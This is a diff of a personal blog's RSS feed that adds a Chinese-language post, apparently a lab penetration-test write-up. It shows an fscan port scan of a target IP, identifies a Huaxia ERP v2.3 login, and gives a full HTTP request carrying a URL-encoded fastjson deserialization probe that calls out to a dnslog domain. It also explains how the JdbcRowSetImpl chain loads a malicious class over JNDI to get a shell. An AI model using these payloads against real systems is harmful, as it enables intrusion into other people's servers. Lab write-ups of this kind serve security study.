@@ -1,5 +1,53 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sun, 13 Sep 2026 02:36:37 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Delegation</title><link>https://faabbi.github.io/post/Delegation.html</link><description>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sun, 20 Sep 2026 12:14:34 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Exchange</title><link>https://faabbi.github.io/post/Exchange.html</link><description>
+# 外网
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# fscan -h 39.99.131.160
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.131.160:22 open
+39.99.131.160:8000 open
+39.99.131.160:80 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://39.99.131.160      code:200 len:19813  title:lumia
+[*] WebTitle http://39.99.131.160:8000 code:302 len:0      title:None 跳转url: http://39.99.131.160:8000/login.html
+[*] WebTitle http://39.99.131.160:8000/login.html code:200 len:5662   title:Lumia ERP
+```
+是个华夏erp v2.3
+[[Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/347135.html)](https://www.freebuf.com/articles/web/347135.html)
+
+开启`checkAutoType`才能打fastjson反序列化，这里靶子开了，这里还是全编码一下吧，不然打不进去
+```text
+GET /user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%67%62%64%6e%67%65%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&amp;currentPage=1&amp;pageSize=15 HTTP/1.1
+Host: 39.99.131.160:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://39.99.131.160:8000/login.html
+Connection: keep-alive
+Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
+Priority: u=0, i
+
+
+```
+
+&lt;img width='1928' height='1073' alt='Image' src='https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40' /&gt;
+
+接下来弹shell，发现一直没法接到响应
+
+Fastjson的`JdbcRowSetImpl`利用链最终会触发JNDI的`lookup()`请求，从你的服务器加载并执行恶意类。</description><guid isPermaLink="true">https://faabbi.github.io/post/Exchange.html</guid><pubDate>Sun, 20 Sep 2026 12:14:02 +0000</pubDate></item><item><title>Delegation</title><link>https://faabbi.github.io/post/Delegation.html</link><description>
 # 外网
 
 依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的
